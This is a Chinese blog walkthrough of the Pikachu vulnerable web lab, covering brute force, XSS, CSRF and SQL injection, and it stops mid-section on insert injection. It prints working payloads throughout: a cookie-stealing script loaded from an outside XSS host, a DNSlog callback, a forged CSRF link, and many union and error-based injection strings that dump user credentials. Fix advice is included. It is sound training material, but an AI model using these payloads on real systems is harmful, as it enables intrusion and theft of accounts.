---
title: Pikachu漏洞平台通关记录
author: 简文涛
categories:
 - Web
tags:
 - Web基础漏洞
 - 靶场
comments: true
top: true
summary: 开始复习最基础的Web漏洞，查漏补缺，打好基础，我也尽量把文章写得详细一些，希望对刚入门的小白能有一些帮助。
img: 'https://i.loli.net/2020/05/21/jAG68sfaB4RHJMZ.jpg'
abbrlink: 30313
date: 2020-05-21 16:26:33
updated:
permalink:
---
开始复习最基础的Web漏洞，查漏补缺，打好基础，我也尽量把文章写得详细一些，希望对刚入门的小白能有一些帮助。

## Pikachu

**简介**

> Pikachu是一个带有漏洞的Web应用系统，在这里包含了常见的web安全漏洞。 如果你是一个Web渗透测试学习人员且正发愁没有合适的靶场进行练习，那么Pikachu可能正合你意。

**安装**

项目地址：https://github.com/zhuifengshaonianhanlu/pikachu

1.将下好的项目放置phpStudy的`WWW`目录下

2.然后修改配置文件`/pikachu-master/inc/config.inc.php`，修改成自己的mysql用户名和密码

3.浏览器访问 http://127.0.0.1/pikachu-master/ 进入主页面

4.点击首页红色字体进行初始化安装

**乱码解决**

如果靶场出现了乱码，我们可以执行以下步骤

1.按"win + R" ，并输入 regedit 进入注册表

2.找到 `HKEY_CURRENT_USER\Console\%SystemRoot%_system32_cmd.exe`，如果该项下已存在 `CodePage` 项，则把值改为十进制 "`65001`"，点击确定即可；如果不存在，在该项下新建一个 DWORD（32位值），命名为 "CodePage"，值设为 "65001"。然后关闭注册表管理器。

## Burte Force

### 基础知识准备

> 暴力破解(Burte Force)是一攻击具手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。 其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。 为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。

**Burp各种攻击模式的区别**

1. **Sinper：**一个变量设置一个payload进行攻击
2. **Battering ram：**可以设置两个变量，把payload同时给两个变量
3. **Pitchfork：**两个变量分别设置payload，然后按顺序一一对应进行破解
4. **Cluster bomb：**两个变量分别设置payload，然后交叉列所有情况进行破解（常用） 

### 基于表单的暴力破解

这个还是比较简单的，抓包发送到intruder模块，配置参数开始攻击就可以了，我就懒得写了，大家可以参考这篇文章

参考：[Pikachu暴力破解——基于表单](https://www.cnblogs.com/ApricityJ/p/12628753.html)

### 验证码绕过(on server)

> 验证码可以用来防止恶意注册、防止暴力破解。

**服务端验证码常见问题：**

- 1.验证码设计的太过简单和有规律，容易被猜解
- 2.验证码校验不严格，逻辑出现问题
- 3.验证码在后台不过期，导致长期可以使用

检查验证码元素，发现验证机制来自后端

![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/EuZBhv5RHaNXzJw.png)

那么我们根据这3个常见问题我们来一一验证是否Pikachu靶场满足上面三条中的情况，那我们打开靶场页面吧！

一、观察验证码，验证码是没有规律的，并且也不简单，所以第一条不满足

二、当验证码输入正确、错误和输入为空会是以下3种情况：

| 验证码正确                                                   | 验证码错误                                                   | 验证码为空                                                   |
| ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ |
| ![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/vjVWKpezmsNaUG4.png) | ![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/6pZYRdMaGClBQ9E.png) | ![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/zQo9KaXrB6tW7fG.png) |

可以看到服务端对验证码的有效性做过校验,一切逻辑正常，所以第二条也不满足

三、我们随便输入用户名和密码，输入正确验证码进行抓包，发送到repeater模块

| 用户名密码不同，验证码相同                                   | 用户名密码不同，验证码相同                                   |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| ![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/Sb3FWYldJEZjmqO.png) | ![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/6nFUis8RyW5LwJE.png) |

按理说输入不同的用户，应该报验证错误的提示，但是这里却没有，说明在输入第二个用户时验证码还没有过期，那么第三种情况就满足了

**漏洞分析:**

- 当刷新页面,客户端向服务器发出请求,生出新的验证码；

- 同时后台会在`session`中将这个验证码存下来【目的是为了对用户输入的验证码进行验证)】；

- 所以当输入错误或空的验证码都会提示错误信息,只有正确的验证码才可以被服务器接受；

- 但是如果这个验证码在后台不过期或者过期时间较长,足够我们去爆破用户名密码,那么漏洞就产生了。

其漏洞根本在于服务器端未设定生出验证码的session的过期时间,那么按照PHP语言默认session的过期时间为24分钟,这个验证码24分钟内都是有效的,那么也足够黑客进行暴力破解啦

那我们就来利用一下这个漏洞吧，将刚才的包发送到intruder模块

1.设置爆破位置及攻击方式

![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/amki1dFVAYKntTS.png)

2.设置payloads，这里为了快速爆破出，我添加了包含正确用户名密码的5个用户，毕竟掌握方法才是最重要的啦

| payload1                                                     | payload2                                                     |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| ![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/2PGq6DNpni9tbS8.png) | ![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/ZPifDKv4Th65r71.png) |

3.点击开始攻击，根据响应长度就可以判断出正确的用户名和密码了

![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/PBQmaFJE7g9Dvzn.png)

**修复方法:**

方法一：在php.ini配置文件中设置过期时间
方法二：在代码中设定该验证码验证过一次之后,就将其session进行销毁(更有效)

### 验证码绕过(on client)

**客户端验证码常见问题:**

- 1.使用前端js实现验证码(纸老虎)
- 2.将验证码在cookie中泄露,容易被获取
- 3.将验证码在前端源代码中泄露,容易被获取

检查验证码元素，发现验证机制来自前端JS

![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/B1sD6CkFEt4qPab.png)

既然验证来自前端JS,那我们我们可以在burp suite不输入验证码或者输入错的验证码完成爆破

| 输错的验证码                                                 | 不输验证码                                                   |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| ![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/fIwRYyGhTumvqox.png) | ![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/GjPi9OX3pEf265k.png) |

可以发现不输入验证码或者输入错的验证码对返回结果并没有影响，说明确实验证来自前端

那我们就来利用一下这个漏洞吧，将包发送到intruder模块,后面步骤跟on server的操作是一样的

1.设置爆破位置及攻击方式

![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/OClQvRkHgIXmNK7.png)

2.设置payloads，这里为了快速爆破出，我添加了包含正确用户名密码的5个用户，毕竟掌握方法才是最重要的啦


| payload1                                                     | payload2                                                     |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| ![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/2PGq6DNpni9tbS8.png) | ![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/ZPifDKv4Th65r71.png) |

3.点击开始攻击，根据响应长度就可以判断出正确的用户名和密码了

![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/PBQmaFJE7g9Dvzn.png)

### token防爆破?

> token是由服务端生成的一串字符串，作为客户端向服务端请求的一个标识。如果前端使用用户名/密码向服务端请求认证，服务端认证成功，那么在服务端会返回 token 给前端。前端可以在每次请求的时候带上 token 证明自己的合法地位。

**token特性**

- token 完全由应用管理，所以它可以避开同源策略

- token防止重复提交和CSRF

- token 可以是无状态的，可以在多个服务间共享
- token无法防止暴力破解

检查元素，发现页面不仅提交username和password，还提交了一个hidden属性的token值

![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/MWVjwsz1ALdQCDu.png)

既然token是无法防止爆破的，那么我们就来爆破试试吧，抓包发送到intruder模块，因为最多只能爆破2个参数，所以要知道用户名才行。

1.设置爆破位置及攻击方式

![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/nPjMAL1toQ5Rubi.png)

2.设置token正则表达式。

在`Options`中的`Grep-Extract`中打勾，点击`add`添加过滤条件 点击`refetch response`找到响应包中的token 之选中，再点击`OK`

![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/2seXrV4KSmHpZPG.png)

在`Options`中将线程设置为`1`，对于每一个包返回来的token值都是不一样的，所以我们只能选择单线程进行攻击

将最下方的`Redirections`选择为`Always`，如果不点上这个就不会打开html包的body部分，因为token值是存储在body的hidden部分，那么也就不会自动获取token值，我们也就不能绕过它进行暴力破解了

| 线程设置                                                     | 重定向设置                                                   |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| ![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/er9q8gfSTU7Qix1.png) | ![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/T7c9YugmfLiStU3.png) |

3.设置payloads。这里为了快速爆破出，密码payload我设置了包含正确密码的5个条目

| payload1                                                     | payload2                                                     |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| ![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/v2uym4JE7XtFCzL.png) | ![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/9JSiA4MEtCx1TdB.png) |

4.点击开始攻击，根据响应长度就可以判断出正确密码了

![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/wecp5GFiQRSa9BM.png)

## XSS

> Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写"CSS"冲突，故又称XSS。形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。

### 反射型xss(get)

**Payload:**

```javascript
<script>alert("jwt")</script>
```

由于前端对输入长度做了限制，我们需要修改一下最大长度才能输入完整的payload，这是一个简单的反射型XSS，从前端输入由后端接受再输出

**源码分析:**

```php
//关键代码
$html.="<p class='notice'>who is {$_GET['message']},i don't care!</p>";

<?php echo $html;?>
```

`$html`变量直接拼接了`{$_GET[‘message’]}`,又直接`echo`，没做任何过滤，转义。

**利用Pikachu-XSS后台获取cookie**

1.访问管理工具里的XSS后台，初始化数据库

2.登录XSS后台，账户admin/123456

3.在反射型xss窗口中插入如下js后，在XSS后台就能成功接收到Cookie

```js
<script src=http://xss.fbisb.com/ij7V></script>
```

由于是GET类型的XSS漏洞，我们可以直接构造一个带有Payload的URL，诱使受害者点击就能取得Cookie

### 反射型xss(post)

可以看到是一个用户登陆窗口，根据提示，账户admin/123456

登上去以后发现还是没有任何过滤，直接构造**Payload:**

```javascript
<script>alert(document.cookie)</script>;
```

### 存储型xss

> 存储型XSS和反射型XSS形成的原因是一样的，不同的是存储型XSS下攻击者的可以将脚本注入到后台存储起来，构成更加持久的危害

**Payload:**

```javascript
<script>alert(document.cookie)</script>
```

没有任何过滤，插入payload后，每次刷新页面都会alert出cookie，说明是存储型的，已经存在数据库了。

**源码分析:**

```php
//关键代码
$message=escape($link, $_POST['message']);
$query="insert into message(content,time) values('$message',now())";

echo "<p class='con'>{$data['content']}</p><a href='xss_stored.php?id={$data['id']}'>删除</a>";
```

对输入的内容没有做任何过滤和转义，直接往数据库里插入了用户输入的内容，输出的时候也没有任何过滤和转义，直接取数据echo出来。

### DOM型xss

> 造成DOM型XSS的原因是前端的输入被DOM给获取到了，通过DOM又在前端输出，跟反射型和存储型比起来，它是不经过后台交互的

**HTML DOM 树**

![](https://www.w3school.com.cn/i/ct_htmltree.gif)

随便输入字符串后点击按钮，可以看到页面显示一条超链接，审查源码

```html
<script>
function domxss(){
    var str = document.getElementById("text").value;
    document.getElementById("dom").innerHTML = "<a href='"+str+"'>what do you see?</a>";
}
</script>

<div id="dom">
  <a href="jwt">what do you see?</a>
</div>
```

发现我们输入的str被调整在id为dom的元素里，还有段JS代码，它通过 getElementById 获取到了标签 id 为 text 的内容赋值给str，然后又把 str 的内容通过字符串拼接的方式写到了 a 标签的 href 属性中，a标签会写到 id 为 dom的 div 标签中。

**通过闭合a标签的方式构造Payload：**

```html
//payload1:
#' onclick=alert("jwt")>

闭合后：<a href='#' onclick="alert("jwt")">'>what do you see?</a>

//payload2:
'><img src="#" onmouseover="alert('jwt')">

闭合后：<a href><img src="#" onmouseover="alert('jwt')">'>what do you see?</a>

    
//payload3:    
' onclick="alert('jwt')">

闭合后：<a href onclick="alert('jwt')"> >'what do you see?</a>    
```

### DOM型xss-x

同样随便输入字符串后点击按钮，可以看到页面显示一条超链接，审查源码

```html
<script>
function domxss(){
    var str = window.location.search;
    var txss = decodeURIComponent(str.split("text=")[1]);
    var xss = txss.replace(/\+/g,' ');
    document.getElementById("dom").innerHTML = "<a href='"+xss+"'>就让往事都随风,都随风吧</a>";
}
</script>

<div id="dom">
    <a href="jwt">就让往事都随风,都随风吧</a>
</div>
```

这里也有段JS代码，它利用 `window.location.search` 获取浏览器中URL的内容，然后赋值给 str ，再经过URL解码和字符串分隔，取出URL中的参数内容，再把 “+” 替换为 “ ”（空格），赋值给 xss，最后把 xss 拼接到 a 标签中，然后写到 id 为 dom 的 div 标签中，跟前面的DOM不同的是，它的输入是从浏览器的URL中获取的，很像反射型XSS(get)

用户的输入同样被拼接到a标签中，构造的`Payload`跟上面是一样的

```html
//payload1:
#' onclick=alert("jwt")>

//payload2:
'><img src="#" onmouseover="alert('jwt')">
    
//payload3:    
' onclick="alert('jwt')">
```

### xss之盲打

> 输入的内容**不会在前端输出**，而是提交到了后台，管理员才可以看到，如果我们输入一段恶意JS代码，管理员登录到后台管理界面，恶意JS代码就会被执行，后台管理员就会遭受到XSS攻击

在页面输入以下内容

![](https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200728184942.png)

查看提示，得到后台地址(/xssblind/admin_login.php)和账户(admin/123456)，登录后台管理界面,成功弹窗

![](https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200728185253.png)

**DNSlog盲打Payload：**

```html
<img src="http://xss.xxxxx.ceye.io/abc>                  
```

如果盲打成功，会在平台上收到如下的链接访问记录：

![](https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200807145213.png)

### xss之过滤

**常见过滤绕过方法：**

- 前端限制绕过，直接抓包重放，或者修改html前端代码。比如反射型XSS(get)中限制输入20个字符。
- 大小写，例如`<SCRIPT>aLeRT(“jwt”)</sCRIpt>`。后台可能用正则表达式匹配，如果正则里面只匹配小写，那就可能被绕过。
- 双写，例如`<scri<script>pt>alert(“jwt”)</scri</script>pt>`。后台可能把`<script>`标签去掉，但可能只去掉一次。
- 注释干扰，例如`<scri<!--test-->pt>alert(“jwt”)</sc<!--test-->ript>`。加上注释后可能可以绕过后台过滤机制。
- 编码，后台过滤了特殊字符，比如`<script>`标签，但该标签可以被各种编码，后台不一定过滤



在页面上输入，进行测试，看看过滤了什么

| 输入`<script>alert("jwt")</script>`                          | 输入`alert("jwt")`                                           |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| ![](https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200728191609.png) | ![](https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200728192142.png) |

可以推测出过滤了`<srcipt`及其之间的字符，尝试大小写混合或使用img标签，成功绕过

```javascript
<SCRIPT>alert("jwt")</sCRIpt>

<img src=x onerror=alert("jwt")>
```

**源码分析：**

```php
$html = '';
if(isset($_GET['submit']) && $_GET['message'] != null){
    //这里会使用正则对<script进行替换为空,也就是过滤掉
    $message=preg_replace('/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/', '', $_GET['message']);
//    $message=str_ireplace('<script>',$_GET['message']);

    if($message == 'yes'){
        $html.="<p>那就去人民广场一个人坐一会儿吧!</p>";
    }else{
        $html.="<p>别说这些'{$message}'的话,不要怕,就是干!</p>";
    }
}
```

后台对用户输入的内容进行了正则匹配过滤，将`<srcipt`和其之间的字符都过滤掉了。但是没有过滤img标签，没有过滤危险函数。

### xss之htmlspecialchars

> htmlspecialchars()是PHP里面**把预定义的字符转换为HTML实体的函数**，这个函数默认情况下是不会编码单引号的

**语法：**

```php
$value = htmlspecialchars($_GET['value'], ENT_COMPAT); 
# 第2个参数规定了如何处理引号
ENT_COMPAT   # 默认,仅对双引号进行编码
ENT_QUOTES   # 推荐,编码单双引号
ENT_NOQUOTES # 不编码任何引号
```

预定义的字符是：

- & （和号）成为  &amp
- " （双引号）成为  &quot
- ' （单引号）成为 &#039
- < （小于）成为  &lt
- \> （大于）成为  &lt

审查元素后发现输入的内容是被拼接在`<a href ="输入的内容">`中

输入`'"<>?#'1399`,可以看到 `"`、`>` 、 `<` 都经过了编码，单引号依然可以使用

![](https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200728194027.png)

**构造Payload:**先使用单引号闭合a标签，然后再进行弹框。提交后需要点击超链接才会弹框

```html
payload1:
#' onclick=alert('jwt') '
闭合后：<a href="#" onclick="alert('jwt')" ''>#' onclick=alert('jwt') '</a>

payload2:
#' onclick='alert(1399)

闭合后：<a href="#" onclick="alert(1399)">#' onclick='alert(1399)</a>
```

### xss之href输出

**源码分析：**

```php+HTML
$message=htmlspecialchars($_GET['message'],ENT_QUOTES);
$html.="<a href='{$message}'> 阁下自己输入的url还请自己点一下吧</a>";
```

使用了都`htmlspecialchars`函数，`><"'&`都被HTML实体化，且用户输入的在`href`标签里，可以使用javascript协议来执行js代码

 构造Payload如下，没有上面被转义的字符

```javascript
javascript:alert('jwt')
```

**防御href :**

- 输入的时候只允许 http 或 https 开头的协议，才允许输出
- 其次再进行htmlspecialchars处理

### xss之js输出

> 漏洞的输出点是在JS中，通过用户的输入动态生成JS代码

随便输入一些字符，检查页面代码

```javascript
<script>
    $ms='输入的字符';
    if($ms.length != 0){
        if($ms == 'tmac'){
            $('#fromjs').text('tmac确实厉害,看那小眼神..')
        }else {
//            alert($ms);
            $('#fromjs').text('无论如何不要放弃心中所爱..')
        }
    }
</script>
```

这段JS代码会把我们的输入放到JS中，然后对这个变量进行判断，然后再输出

 **构造Payload：**

用一个单引号和`</script>`闭合掉页面中的`<script>`，然后再插入自己的JS代码

```javascript
'</script><script>alert('jwt')</script>
```

![](https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200728201421.png)

其他Payload

```javascript
'; alert(1); //
'</script><script>alert(1)//
```

**修复需要注意的问题：**

1.这里如果进行html的实体编码,虽然可以解决XSS的问题,但是实体编码后的内容,在JS里面不会进行翻译,这样会导致前端的功能无法使用。

2.所以在JS的输出点应该使用\对特殊字符进行转义

### XSS防范

 **输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入;**
 **输出转义：根据输出点的位置对输出到前端的内容进行适当转义;**

**参考：**

https://www.cnblogs.com/dogecheng/p/11556221.html

https://blog.csdn.net/weixin_41652128/article/details/95669624

[XSS常见Payload](https://www.cnblogs.com/xuehen/p/4814237.html)

## **CSRF**

> 跨站请求伪造-Cross-site request forgery 简称为“CSRF”，在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为"one click"攻击。 

简单理解：攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。

**CSRF与XSS的区别：**

CSRF是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而XSS是直接盗取到了用户的权限，然后实施破坏。

### CSRF(get)

根据提示，账号有vince/allen/kobe/grady/kevin/lucy/lili，密码全部是123456

我们登录 kobe 用户，登录后来到个人中心，可以在这修改个人信息

那么更改kobe信息，并抓包

![](https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200807180231.png)

从请求包可以看出，后台没做 CSRF token，且是通过 GET 请求来提交修改信息的

**Payload：**

将性别、手机、住址、邮箱都重新定义数据

```
http://127.0.0.1/pikachu-master/vul/csrf/csrfget/csrf_get_edit.php?sex=2&phonenum=123456&add=Chengdu&email=jwt@163.com&submit=submit
```

将该URL发送给用户，若用户在`登录状态`下点击这个URL，则该用户的信息就会被更改为我们定义的信息

**实例演示：**

例如，我们让用户 allen 点击一下上面这个 Payload 链接

1、allen用户登录，查看个人信息

![](https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200807201741.png)

2、allen用户点击上面我们构造的Payload

3、再次查看信息，发现allen的性别、手机、住址、邮箱，已经修改为我上面 Payload 中定义的数据了，成功实现 CSRF 攻击

![](https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200807201741.png)

### CSRF(post)

抓包发现，请求通过POST方式提交，从而无法像前面一样通过伪造URL来进行攻击

详细利用过程请参考：[Pikachu漏洞靶场系列之CSRF](https://www.naraku.cn/posts/25.html)

CSRFTester下载地址：https://wiki.owasp.org/images/0/08/CSRFTester-1.0.zip

### CSRF Token

原理：CSRF的主要问题是敏感操作的链接容易被伪造。而只要在每次请求时都增加一个随机码`Token`，后台每次都对这个随机码进行验证，则可以有效地防止CSRF

在源码`token_get_edit.php`中看到，每次刷新页面，都会调用`set_token()`函数，该函数会把`SESSION`中`Token`销毁，然后生成一个新的`Token`，并将这个`Token`传到前端表单中

```html
<div id="per_info">
   <form method="get">
   <h1 class="per_title">hello,{$name},欢迎来到个人会员中心 | <a style="color:bule;" href="token_get.php?logout=1">退出登录</a></h1>
   <p class="per_name">姓名:{$name}</p>
   <p class="per_sex">性别:<input type="text" name="sex" value="{$sex}"/></p>
   <p class="per_phone">手机:<input class="phonenum" type="text" name="phonenum" value="{$phonenum}"/></p>    
   <p class="per_add">住址:<input class="add" type="text" name="add" value="{$add}"/></p> 
   <p class="per_email">邮箱:<input class="email" type="text" name="email" value="{$email}"/></p>
       
   <input type="hidden" name="token" value="{$_SESSION['token']}" />
       
   <input class="sub" type="submit" name="submit" value="submit"/>
   </form>
</div>
```

当每次提交表单时，这个`Token`值就会传到后台与`SESSION`中的`Token`进行比较，若不相等，此次表单则提交失败。所以黑客由于不能得知用户当前的`Token`值，从而无法进行CSRF攻击。

### CSRF防范

- 对敏感信息的操作增加安全的token；
- 对敏感信息的操作增加安全的验证码；
- 对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等。

## **SQL-Inject**

> **SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。 从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。**

**这里我就不讲原理了，需要了解SQL注入原理的，请看我另一篇文章：[深入剖析SQL注入](https://jwt1399.top/posts/32179.html)**

### **数字型注入(post)**

**直接 BurpSuite 抓包，发到 Repeater 中，修改 id 参数的值，查看响应结果。**

```sql
#查看页面变化，判断sql注入类别 
id=1
id=1'

#确定字段数 
id=1 order by 2 
id=1 order by 3 

#联合查询查看显示位 
id=-1 union select 1,2 

#爆库【pikachu】
id=-1 union select 1,group_concat(schema_name) from information_schema.schemata 
或者
id=-1 union select 1,database() 

#爆表【httpinfo,member,message,users,xssblind】
id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() 

#爆列【...user,password,...】 
id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name='users' 

#爆值 
id=-1 union select 1,concat_ws('-',username,password) from users
```

**![](https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200726142002.png)**

### **字符型注入(get)**

```sql
#查看页面变化，判断sql注入类别 
1
1'

#确定字段数【2】  
1' order by 3 # 
1' order by 4 # 

#联合查询查看显示位
-1' union select 1,2 # 

#爆库【pikachu】 
-1' union select 1,group_concat(schema_name) from information_schema.schemata #
或者
-1' union select 1,database() # 

#爆表【httpinfo,member,message,users,xssblind】 
-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #

#爆列【...,username,password,...】 
-1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #

#爆值
-1' union select 1,concat_ws('-',username,password) from users #
```

**![](https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200726142232.png)**

### **搜索型注入**

**搜索型查询使用的 SQL 语句格式：**

```sql
select username from user where username like '%{$username}%';
```

**此时可将`{$username}`部分构造成 payload：`x%' union select 1,2 from users #`**

**此时执行的 SQL 语句为：**

```sql
select username from user where username like '%x%' union select 1,2 from users #%';
```

**搜索型注入使用上面的字符型注入方法也可实现注入，这里我就使用新的绕过 payload**

```sql
#查看页面变化，判断sql注入类别 
1
1'

#确定字段数【3】  
x%' order by 3 # 
x%' order by 4 # 

#联合查询查看显示位
x%' union select 1,2,3 # 

#爆库【pikachu】 
x%' union select 1,2,group_concat(schema_name) from information_schema.schemata #
或者
x%' union select 1,2,database() # 

#爆表【httpinfo,member,message,users,xssblind】 
x%' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() #

#爆列【...,username,password,...】 
x%' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' #

#爆值
x%' union select 1,2,concat_ws('-',username,password) from users #
```

### **xx型注入**

```sql
#查看页面变化，判断sql注入类别 
1
1'     #  for the right syntax to use near ''1'')' at line 1

猜测SQL语句为select username from user where username=('$name');


#确定字段数【2】  
x') order by 2 # 
x') order by 3 # 

#联合查询查看显示位
x') union select 1,2 # 

#爆库【pikachu】 
x') union select 1,group_concat(schema_name) from information_schema.schemata #
或者
x') union select 1,database() # 

#爆表【httpinfo,member,message,users,xssblind】 
x') union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #

#爆列【...,username,password,...】 
x') union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #

#爆值
x') union select 1,concat_ws('-',username,password) from users #
```

### **“insert/update”注入**

> **insert /update注入是指我们前端注册的信息，后台会通过 insert/update 这个操作插入/更新到数据库中。如果后台没对我们的输入做防 SQL 注入处理，我们就能在注册时通过拼接 SQL 注入。**

#### **insert注入**

**进入注册页面，填写必填的两项，用户那里输入单引号，密码输入123，页面会有报错信息(` for the right syntax to use near '123'),'','','','')' at line 1`)，说明存在SQL注入漏洞**

**猜测sql语句为：**

```sql
$query="insert into member(username,pw,sex,phonenum,email,address) values('$username','$password','$sex','$phonenum','$email','add')";
```
**)构造Payload：此处最后多加一个`)`闭合`value()`的`(`，用注释符`#`解决`value()`的`)`**

**1、爆库**

**updatexml()函数：**

```sql
1' and updatexml(1,concat('~',database()),1)) #
```

**extractvalue()函数：**

```sql
1' and extractvalue(1,concat('~',database()))) #
```

**floor()函数：**

```sql
1' and (select 1 from (select count(*),concat('~',database(),'~',floor(rand(0)*2))as x from information_schema.tables group by x)a))#
```

**2、爆表**

**updatexml()函数：**

```sql
1' and updatexml(1,concat('~',(select table_name from information_schema.tables where table_schema = database() limit 0,1)),1))#
```

**extractvalue()函数：**

```sql
1' and extractvalue(1,concat('~',(select table_name from information_schema.tables where table_schema = database() limit 0,1))))#
```

**floor()函数：**

```sql
1'and (select 1 from (select count(*),concat('~',(select table_name from information_schema.tables where table_schema = database() limit 0,1),'~',floor(rand(0)*2))as x from information_schema.tables group by x)a))#
```

**3、爆字段**

**updatexml()函数：**

```sql
1' and updatexml(1,concat('~',(select column_name from information_schema.columns where table_name = 'users' limit 0,1)),1))#
```

**extractvalue()函数：**

```sql
1' and extractvalue(1,concat('~',(select column_name from information_schema.columns where table_name = 'users' limit 0,1))))#
```

**floor()函数：**

```sql
1'and (select 1 from (select count(*),concat('~',(select column_name from information_schema.columns where table_name = 'users' limit 0,1),'~',floor(rand(0)*2))as x from information_schema.tables group by x)a))#
```

**4、爆值**

**updatexml()函数：**

```sql
